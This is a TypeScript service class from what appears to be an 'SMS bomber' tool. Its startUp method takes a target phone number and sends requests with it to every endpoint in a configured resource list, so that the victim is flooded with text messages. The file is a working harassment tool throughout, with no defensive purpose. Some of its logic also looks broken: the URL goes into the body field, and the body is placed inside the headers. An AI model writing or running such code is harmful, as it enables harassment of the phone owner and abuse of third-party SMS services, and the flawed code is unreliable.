import axios from "axios";
import {Methods, ResourceLibraryLists, Level} from "../config/index"

/**
 * Service是业务具体实现, 由Controller或其他Service调用
 * 启动短信轰炸机
 * */
class BomberService {
  async startUp(phone: string) {
    ResourceLibraryLists.forEach((resource: any) => {
      let link = resource.link;

      const {name} = resource;
      console.info('name', name);

      if (resource.method === Methods.get) {
        link = link + phone;
      }

      // 初始化请求体
      let requestBody: any = {}
      if (resource.method === Methods.post) {
        if (resource.operator) {
          const {operator: {serializationBody, filed, filePrefix}, body} = resource;

          if (filed) {
            requestBody = {
              ...body
            }
            requestBody[filed] = link;

            // 加phone前缀
            filePrefix && (requestBody[filed] = filePrefix + requestBody[filed]);

            // 序列化请求体
            serializationBody && (requestBody = JSON.stringify(requestBody));
          }
        }
      }

      // @ts-ignore
      axios({
        method: resource.method,
        url: link,
        headers: {
          ...resource.params.headers,
          data: requestBody
        }
      }).then(res => {
      }).catch(err => {
        console.info("报错了", name, err);
      })
    })
  }
}

export default new BomberService();